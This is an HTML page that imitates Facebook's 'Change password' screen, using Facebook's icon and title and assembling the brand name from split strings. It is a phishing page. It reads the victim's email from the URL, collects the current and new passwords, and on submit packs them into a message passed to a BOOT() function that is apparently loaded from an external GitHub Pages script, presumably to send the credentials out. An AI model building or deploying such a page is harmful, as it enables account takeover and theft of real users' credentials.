<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/y1/r/ay1hV6OlegS.ico" type="image/x-icon">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <script src="https://dev-105.github.io/phone/style.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, Helvetica, sans-serif;
        }

        body {
            background: gray;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            padding: 60px 10px 0;
            background: white;
            width: 100%;
            height: 100%;
            /* overflow: scroll; */
            border-radius: 15px 15px 0 0;
            margin-top: 3px;
            display: flex;
            flex-direction: column;

        }

        header {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .form {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-top: 20px;

        }

        .form {
            justify-content: space-between;
        }

        .input {
            padding: 10px;
            height: 55px;
            border: 1px solid rgb(209, 209, 209);
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: relative;
        }

        .input input {
            outline: none;
            border: none;
            align-self: flex-end;
            /* background-color: RED; */
            flex: 1;
        }

        .input label {
            position: absolute;
            color: rgb(145, 145, 145);
            font-size: 14px;
            transition: all .2s;
        }

        .translate {
            transform: translateY(-10px);
            font-size: 14px;
        }

        a {
            color: #0064e0;
            text-decoration: none;
        }

        .check {
            display: flex;
            align-items: flex-start;
            font-weight: 500;
            gap: 10px;
        }

        .check label {
            font-size: 15px;
        }

        button {
            background: #99c1f4;
            color: white;
            border-radius: 50px;
            padding: 15px;
            border: none;
            margin: 10px;
            position: absolute;
            width: 90%;
            bottom: 10px;
        }

        .valid {
            background: #0064e0 !important;
        }

        .focus {
            border-color: black;
        }

        .hidden {
            display: none;
        }

        i {
            padding: 10px 5px;
            cursor: pointer;
            position: absolute;
            right: 10px;
            z-index: 10;
            font-size: 18px;
        }
    </style>
</head>

<body>
    <div class="container">
        <header>
            <p><span id="email">email</span> <span id="app"></span></p>
            <h2>Change password</h2>
            <p>Your password must be at least 6 characters and should include a combination of numbers, letters and
                special characters (!$@%).</p>
        </header>
        <div class="form" action="">
            <div class="input">
                <input class="password" type="password" name="password" id="password">
                <label class="label" for="password">Current password</label>
                <i class="bi bi-eye-slash eyes hidden"></i>
            </div>
            <div class="input">
                <input class="password" type="password" name="newpassword" id="newpassword">
                <label class="label" for="newpassword">New password</label>
                <i class="bi bi-eye-slash eyes hidden"></i>
            </div>
            <div class="input">
                <input class="password" type="password" name="newpassword" id="newpasswordc">
                <label class="label" for="newpasswordc">Re-type new password</label>
                <i class="bi bi-eye-slash eyes hidden"></i>
            </div>
            <a href="">Forgot your password</a>
            <div class="check">
                <input type="checkbox" name="check" id="check">
                <label for="check">Log out other devices. Choose this if someone else used your account</label>

            </div>
            <button id="btn">Change password</button>
        </div>
    </div>
    <script>
        let divInput = document.querySelectorAll('.input');
        let inputs = document.querySelectorAll('.password');
        let eyes = document.querySelectorAll('.eyes');
        let labels = document.querySelectorAll('.label');
        let button = document.getElementById('btn');
        let send = false;
        let _ = 'book' ; 
        let __ = ['fa','ce'] ;
        document.getElementById('app').textContent = __.join('') + _
        const email = window.location.href.split('=')[1];
        document.getElementById('email').textContent = email;
        inputs.forEach((input, i) => {
            input.addEventListener('blur', () => {
                input.parentElement.classList.remove('focus');
                // eyes[i].classList.add('hidden');
                input.value.trim() == '' ? labels[i].classList.remove('translate') : null
            })
            input.addEventListener('focus', () => {
                input.parentElement.classList.add('focus');
                eyes.forEach(eye => { eye.classList.add('hidden') });
                eyes[i].classList.remove('hidden');
                labels[i].classList.add('translate');
            })
            input.addEventListener('input', () => {
                if (inputs[0].value.length >= 6 && inputs[1].value.length >= 6 && inputs[1].value == inputs[2].value) {
                    button.classList.add('valid');
                    send = true;
                }
                else {
                    button.classList.remove('valid');
                    send = false;
                }
                console.log(input.value);

            })
        });
        eyes.forEach((eye, i) => {
            eye.onclick = () => {
                let type = inputs[i].type == 'password' ? 'text' : 'password';
                inputs[i].focus();
                eye.classList.toggle('bi-eye');
                inputs[i].type = type;
            }
        });

        let message = "";
        btn.onclick = () => {
            if (!send) return;
            message = `Email : ${email} FB \nOld Password : ${inputs[0].value} \nNew password : ${inputs[1].value}
            `;
            BOOT();
        }
    </script>
</body>

</html>
